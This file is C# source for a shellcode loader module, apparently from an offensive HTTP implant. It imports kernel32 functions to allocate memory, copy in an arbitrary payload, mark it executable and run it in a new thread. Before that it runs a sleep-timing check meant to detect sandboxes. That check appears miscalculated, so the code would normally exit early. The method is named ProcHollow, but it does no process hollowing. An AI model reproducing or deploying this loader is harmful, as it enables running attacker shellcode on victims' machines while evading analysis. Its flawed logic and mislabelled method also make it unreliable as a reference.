using System;
using System.Runtime.InteropServices;

namespace HTTPImplant.Modules
{
    public class ShellcodeLoader
    {
        [Flags]
        public enum AllocationType
        {
            Commit = 0x1000,
            Reserve = 0x2000,
            Decommit = 0x4000,
            Release = 0x8000,
            Reset = 0x80000,
            Physical = 0x400000,
            TopDown = 0x100000,
            WriteWatch = 0x200000,
            LargePages = 0x20000000
        }

        [Flags]
        public enum MemoryProtection
        {
            Execute = 0x10,
            ExecuteRead = 0x20,
            ExecuteReadWrite = 0x40,
            ExecuteWriteCopy = 0x80,
            NoAccess = 0x01,
            ReadOnly = 0x02,
            ReadWrite = 0x04,
            WriteCopy = 0x08,
            GuardModifierflag = 0x100,
            NoCacheModifierflag = 0x200,
            WriteCombineModifierflag = 0x400
        }

        [DllImport("kernel32.dll")]
        static extern void Sleep(uint dwMilliseconds);

        [DllImport("kernel32.dll")]
        public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, AllocationType flAllocationType, MemoryProtection flProtect);

        [DllImport("kernel32.dll")]
        public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, out IntPtr lpThreadId);

        [DllImport("Kernel32.dll")]
        public static extern bool VirtualProtect(IntPtr lpAddress, uint dwSize, uint flNewProtect, out uint lpflOldProtect);

        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        delegate void MyFunction();

        [DllImport("kernel32.dll")]
        public static extern uint WaitForSingleObject(IntPtr hHandle, uint dwMilliseconds);

        public static void ProcHollow(byte[] buf)
        {
            DateTime t1 = DateTime.Now;
            Sleep(5000);
            double deltaT = DateTime.Now.Subtract(t1).TotalSeconds;
            if (deltaT < 9.5)
            {
                return;
            }

            byte[] shellcode = buf;

            var baseAddress = VirtualAlloc(IntPtr.Zero, (uint)shellcode.Length, AllocationType.Commit | AllocationType.Reserve, MemoryProtection.ReadWrite);

            // Copy the shellcode into the memory region
            Marshal.Copy(shellcode, 0, baseAddress, shellcode.Length);

            // For VirtualProtect
            uint oldProtect;
            VirtualProtect(baseAddress, (uint)shellcode.Length, (uint)MemoryProtection.ExecuteRead, out oldProtect);

            // For CreateThread
            IntPtr threadId;
            var hThread = CreateThread(IntPtr.Zero, 0, baseAddress, IntPtr.Zero, 0, out threadId);

            // Wait infinitely on this thread to stop the process exiting
            WaitForSingleObject(hThread, 0xFFFFFFFF);
        }
    }
}